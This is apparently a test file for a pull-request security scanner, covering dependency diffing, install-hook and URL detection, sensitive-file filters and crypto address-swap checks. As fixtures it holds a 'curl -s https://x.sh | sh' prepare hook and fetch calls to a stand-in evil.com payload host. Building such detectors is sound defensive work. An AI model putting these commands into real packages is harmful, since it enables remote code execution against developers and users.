import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  diffManifest,
  mergeDependencyChanges,
  diffInstallScripts,
  addedLines,
  extractUrls,
  chunkDiff,
  shouldSkipFile,
  isSensitiveFile,
  diffLineLocation,
} from "../src/extract.js";

const pick = (deps) => deps.map(({ name, from, to, exact }) => ({ name, from, to, exact }));

test("package.json: new and bumped deps only, ranges flagged inexact", () => {
  const base = JSON.stringify({ dependencies: { lodash: "4.17.21", express: "^4.18.0", left: "1.0.0" } });
  const head = JSON.stringify({
    dependencies: { lodash: "4.17.15", express: "^4.18.0", minimist: "~1.2.0" },
    devDependencies: { mine: "git+https://github.com/x/y.git" },
  });
  assert.deepEqual(pick(diffManifest("package.json", base, head)), [
    { name: "lodash", from: "4.17.21", to: "4.17.15", exact: true },
    { name: "minimist", from: null, to: "1.2.0", exact: false },
    { name: "mine", from: null, to: null, exact: false },
  ]);
});

test("package-lock.json v3: nested copies and new transitive versions", () => {
  const lock = (pkgs) => JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "app" }, ...pkgs } });
  const base = lock({ "node_modules/lodash": { version: "4.17.21" } });
  const head = lock({
    "node_modules/lodash": { version: "4.17.15" },
    "node_modules/a/node_modules/minimist": { version: "1.2.0" },
    "node_modules/linked": { link: true },
  });
  assert.deepEqual(pick(diffManifest("package-lock.json", base, head)), [
    { name: "lodash", from: "4.17.21", to: "4.17.15", exact: true },
    { name: "minimist", from: null, to: "1.2.0", exact: true },
  ]);
});

test("package-lock.json v1 nested dependencies", () => {
  const head = JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: "1.0.0", dependencies: { b: { version: "2.0.0" } } } } });
  assert.deepEqual(diffManifest("package-lock.json", null, head).map((d) => `${d.name}@${d.to}`), ["a@1.0.0", "b@2.0.0"]);
});

test("requirements.txt: pins, ranges, extras, markers, comments, options", () => {
  const head = [
    "# deps",
    "-r base.txt",
    "--index-url https://pypi.org/simple",
    "Django==3.2.0  # pinned",
    "requests[socks]>=2.19,<3 ; python_version >= '3.8'",
    "PyYAML",
    "pkg @ https://example.com/pkg.whl",
  ].join("\n");
  assert.deepEqual(pick(diffManifest("requirements-dev.txt", "django==3.1.0\n", head)), [
    { name: "django", from: "==3.1.0", to: "3.2.0", exact: true },
    { name: "requests", from: null, to: "2.19", exact: false },
    { name: "pyyaml", from: null, to: null, exact: false },
    { name: "pkg", from: null, to: null, exact: false },
  ]);
});

test("pyproject.toml: PEP 621 and Poetry tables", () => {
  const head = `
[project]
dependencies = ["jinja2==2.10", "flask>=2.0"]
[project.optional-dependencies]
dev = ["pytest==7.0.0"]
[tool.poetry.dependencies]
python = "^3.10"
urllib3 = "1.24.1"
[tool.poetry.group.test.dependencies]
httpx = { version = "^0.23" }
`;
  assert.deepEqual(diffManifest("pyproject.toml", "", head).map((d) => `${d.name}@${d.to}:${d.exact}`), [
    "jinja2@2.10:true",
    "flask@2.0:false",
    "pytest@7.0.0:true",
    "urllib3@1.24.1:true",
    "httpx@0.23:false",
  ]);
});

test("go.mod: block and single-line require, comments stripped", () => {
  const head = `module x
go 1.22
require github.com/single/mod v1.0.0
require (
\tgolang.org/x/net v0.0.0-20210220033124-5f55cee0dc0d // indirect
\tgithub.com/gin-gonic/gin v1.6.0
)
`;
  const base = "module x\nrequire github.com/gin-gonic/gin v1.9.1\n";
  assert.deepEqual(pick(diffManifest("go.mod", base, head)), [
    { name: "github.com/single/mod", from: null, to: "v1.0.0", exact: true },
    { name: "golang.org/x/net", from: null, to: "v0.0.0-20210220033124-5f55cee0dc0d", exact: true },
    { name: "github.com/gin-gonic/gin", from: "v1.9.1", to: "v1.6.0", exact: true },
  ]);
});

test("Cargo.toml: caret by default, = pins, renamed and target deps", () => {
  const head = `
[dependencies]
serde = "1.0.100"
tokio = { version = "=1.18.0", features = ["full"] }
my_rand = { package = "rand", version = "0.8" }
local = { path = "../local" }
[target.'cfg(unix)'.dependencies]
nix = "0.26"
`;
  assert.deepEqual(diffManifest("Cargo.toml", "", head).map((d) => `${d.name}@${d.to}:${d.exact}`), [
    "serde@1.0.100:false",
    "tokio@1.18.0:true",
    "rand@0.8:false",
    "local@null:false",
    "nix@0.26:false",
  ]);
});

test("removed manifest yields nothing; malformed manifest throws", () => {
  assert.deepEqual(diffManifest("package.json", '{"dependencies":{"a":"1.0.0"}}', null), []);
  assert.throws(() => diffManifest("package.json", null, "{not json"));
});

test("mergeDependencyChanges prefers lockfile exact versions and marks direct deps", () => {
  const merged = mergeDependencyChanges([
    { ecosystem: "npm", name: "lodash", from: "^4.17.21", to: "4.17.15", spec: "^4.17.15", exact: false, manifest: "package.json" },
    { ecosystem: "npm", name: "lodash", from: "4.17.21", to: "4.17.15", spec: "4.17.15", exact: true, manifest: "package-lock.json" },
    { ecosystem: "npm", name: "minimist", from: null, to: "1.2.0", spec: "1.2.0", exact: true, manifest: "package-lock.json" },
  ]);
  assert.deepEqual(merged.map((d) => `${d.name}@${d.to}:${d.direct}:${d.manifest}`), [
    "lodash@4.17.15:true:package-lock.json",
    "minimist@1.2.0:false:package-lock.json",
  ]);
});

test("install scripts: added and changed hooks, other scripts ignored", () => {
  const base = JSON.stringify({ scripts: { prepare: "husky install", test: "jest" } });
  const head = JSON.stringify({ scripts: { prepare: "curl -s https://x.sh | sh", postinstall: "node setup.js", test: "vitest" } });
  assert.deepEqual(diffInstallScripts("package.json", base, head).map((s) => `${s.script}:${s.change}`), ["postinstall:added", "prepare:changed"]);
  assert.deepEqual(diffInstallScripts("requirements.txt", "", "x"), []);
});

test("addedLines tracks new-file line numbers across hunks", () => {
  const patch = readFileSync(new URL("./fixtures/prs/clean.patch", import.meta.url), "utf8");
  assert.deepEqual(addedLines(patch).map((l) => l.line), [10, 11, 12]);
});

test("extractUrls: added lines only, deduped, placeholders and lockfiles skipped", () => {
  const files = [
    { filename: "src/a.js", patch: "@@ -1,1 +1,4 @@\n-fetch('https://old.evil.com/x')\n+fetch('https://new.evil.com/payload.sh');\n+// http://localhost:3000 and https://api.example.com/v1\n+fetch('https://new.evil.com/payload.sh')\n ctx" },
    { filename: "package-lock.json", patch: "@@ -1 +1 @@\n+\"resolved\": \"https://registry.npmjs.org/x.tgz\"" },
  ];
  assert.deepEqual(extractUrls(files), [{ url: "https://new.evil.com/payload.sh", file: "src/a.js", line: 1 }]);
});

test("file filters: lockfiles, vendored, minified, binaries, sensitive files", () => {
  for (const p of ["yarn.lock", "go.sum", "vendor/x.go", "web/dist/app.js", "a.min.js", "logo.png", ".env", "config/.env.production", "deploy/key.pem", "id_rsa"]) {
    assert.ok(shouldSkipFile(p), p);
  }
  for (const p of ["src/app.js", ".env.example", "README.md", "package.json"]) assert.ok(!shouldSkipFile(p), p);
  assert.ok(isSensitiveFile(".env.local") && !isSensitiveFile(".env.sample"));
});

test("chunkDiff packs small files together and splits large ones under the limit", () => {
  const hunk = (n) => `@@ -${n},1 +${n},1 @@\n-old${n}\n+${"x".repeat(300)}\n`;
  const big = Array.from({ length: 20 }, (_, i) => hunk(i + 1)).join("");
  const chunks = chunkDiff(
    [
      { filename: "a.js", patch: hunk(1) },
      { filename: "b.js", patch: hunk(2) },
      { filename: "big.js", patch: big },
      { filename: "yarn.lock", patch: hunk(3) },
      { filename: "image.png" },
    ],
    { maxChars: 1500 },
  );
  assert.ok(chunks.every((c) => c.text.length <= 1500), "every chunk under the limit");
  assert.deepEqual(chunks[0].files.slice(0, 2), ["a.js", "b.js"]);
  assert.ok(chunks.length > 2, "big file split across chunks");
  assert.ok(!chunks.some((c) => c.files.includes("yarn.lock")));
  assert.ok(chunks.filter((c) => c.files.includes("big.js")).every((c) => c.text.includes("diff --git a/big.js")), "each piece keeps the file header");
});

test("diffLineLocation maps a line of diff text to its file and new-file line", () => {
  const d = ["diff --git a/a.js b/a.js", "@@ -10,2 +10,3 @@", " ctx", "-old", "+new", "diff --git a/b.py b/b.py", "@@ -1 +1 @@", "+x = 1"].join("\n");
  assert.deepEqual(diffLineLocation(d, 3), { file: "a.js", line: 10 });
  assert.equal(diffLineLocation(d, 4), null, "removed lines have no new location");
  assert.deepEqual(diffLineLocation(d, 5), { file: "a.js", line: 11 });
  assert.deepEqual(diffLineLocation(d, 8), { file: "b.py", line: 1 });
  assert.equal(diffLineLocation(d, 1), null);
});

test("documentation is not sent for a paid code review", async () => {
  const { isDocFile } = await import("../src/extract.js");
  for (const p of ["README.md", "README", "docs/guide.mdx", "CHANGELOG", "LICENSE.txt", "notes.rst"]) assert.ok(isDocFile(p), p);
  for (const p of ["src/app.js", "readme.js", "docs/build.py", "Dockerfile"]) assert.ok(!isDocFile(p), p);
  assert.deepEqual(chunkDiff([{ filename: "README.md", patch: "@@ -1 +1 @@\n+x" }, { filename: "a.js", patch: "@@ -1 +1 @@\n+y" }]).map((c) => c.files), [["a.js"]]);
});

// ---- on-chain addresses ------------------------------------------------------
import { extractAddresses, addressChanges } from "../src/extract.js";

const cfg = (patch, filename = "src/config.ts") => [{ filename, patch }];

test("extractAddresses: new addresses on added lines, with the chain named nearby or Ethereum assumed", () => {
  const files = cfg('@@ -1,1 +1,4 @@\n x\n+export const VAULT = "0x2222222222222222222222222222222222222222";\n+export const USDC_POLYGON = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"; // polygon\n+const MAINNET_ROUTER = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";');
  assert.deepEqual(extractAddresses(files).map((a) => [a.address.slice(0, 6), a.chain, a.assumed, a.line]), [
    ["0x2222", "Ethereum", true, 2],
    ["0x3c49", "Polygon", false, 3],
    ["0x7a25", "Ethereum", false, 4],
  ]);
});

test("extractAddresses skips placeholders, transaction hashes, moved addresses, docs and lockfiles", () => {
  const files = [
    ...cfg('@@ -1,1 +1,4 @@\n-const A = "0x1111111111111111111111111111111111111111";\n+const A2 = "0x1111111111111111111111111111111111111111";\n+const ZERO = "0x0000000000000000000000000000000000000000";\n+const TX = "0x0c6b9b4a5e8d21ef0ce9b9e6240e46f403683255b76976c2d39103d7f202cd85";\n+const NATIVE = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";'),
    { filename: "README.md", patch: "@@ -1 +1 @@\n+Send to 0x3333333333333333333333333333333333333333" },
    { filename: "package-lock.json", patch: "@@ -1 +1 @@\n+\"0x4444444444444444444444444444444444444444\"" },
  ];
  assert.deepEqual(extractAddresses(files), []);
});

test("addressChanges: a file that swaps one address for another, the address-swap attack shape", () => {
  const files = cfg('@@ -1,1 +1,1 @@\n-export const PAYOUT = "0x1111111111111111111111111111111111111111";\n+export const PAYOUT = "0x2222222222222222222222222222222222222222";');
  assert.deepEqual(addressChanges(files), [{ file: "src/config.ts", line: 1, from: "0x1111111111111111111111111111111111111111", to: "0x2222222222222222222222222222222222222222" }]);
  assert.deepEqual(addressChanges(cfg('@@ -1,1 +1,2 @@\n x\n+const NEW = "0x2222222222222222222222222222222222222222";')), [], "an added address with none removed isn't a swap");
});
